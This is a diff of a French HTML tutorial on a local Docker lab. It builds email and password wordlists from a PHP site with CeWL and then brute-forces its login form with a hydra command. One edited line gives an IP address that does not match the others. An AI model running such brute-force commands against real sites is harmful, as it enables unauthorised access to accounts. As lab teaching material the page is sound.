@@ -13,7 +13,7 @@
 <h2 class="mb-3"></br>2. Configuration</h2>
 <p>
 	Pour ce tutoriel, nous utiliserons docker contenant un serveur php avec un site web en local 
-	et une machine attaquante sous linux avec l’outil CeWL d’installé.</br>
+	et une machine avec l’outil CeWL d’installé.</br>
 	Télécharger le fichier <a class="link-primary" href="Docker/cewl/docker-compose.yml" download="docker-compose.yml"><U>docker-compose.yml</U></a>
 	Tapez les commandes suivantes :
 </p>
@@ -26,13 +26,12 @@
 <h2 class="mb-3"></br>3. Brute force un login</h2>
 <p>
 	Pour voir le site web, tapez dans un navigateur : </br>
-	<a class="link-primary" href="http://192.168.1.3:80"><u>http://192.168.1.3:80</u></a> </br>
-	Le site web à attaquer depuis la machine est 192.168.1.3:5000
+	<a class="link-primary" href="http://192.168.30.3"><u>http://192.168.30.3</u></a> </br>
 </p>
 
 <p>
 	Commençons par créer une liste de mails :</br>
-	<kbd class="ms-3">cewl http://192.168.1.3:80/index.html -e -n -w email.txt -v</kbd></br>
+	<kbd class="ms-3">cewl http://192.168.1.30:80/index.html -e -n -w email.txt -v</kbd></br>
 	<ul>
 		<li>-e : génère une liste avec des adresses électroniques</li>
 		<li>-n : masque la liste de mot généré pour n'avoir que des adresses électroniques</li>
@@ -43,14 +42,14 @@
 
 <p>
 	Construisons ensuite notre liste personnalisée de mots : </br>
-	<kbd class="ms-3">cewl http://192.168.1.2:80/index.html -w wordlist.txt -v</kbd></br>
+	<kbd class="ms-3">cewl http://192.168.30.3:80/index.html -w wordlist.txt -v</kbd></br>
 	<img src="Tutoriel/tuto-cewl/cewl_2.png" alt="" class=img-fluid">
 
 </p>
 
 <p>
 	Une fois le mail et la liste de mots de passe obtenus, on peut essayer de brute force la page de login à l'aide de l'outil hydra :</br>
-	<kbd class="ms-3">hydra -L email.txt -P wordlist.txt 192.168.1.3 http-get-form "/secret.php:email=^USER^&password=^PASS^:F=incorrect"</kbd></br>
+	<kbd class="ms-3">hydra -L email.txt -P wordlist.txt 192.168.30.3 http-get-form "/secret.php:email=^USER^&password=^PASS^:F=incorrect"</kbd></br>
 	<img src="Tutoriel/tuto-cewl/cewl_3.png" alt="" class=img-fluid">
 </p>
 
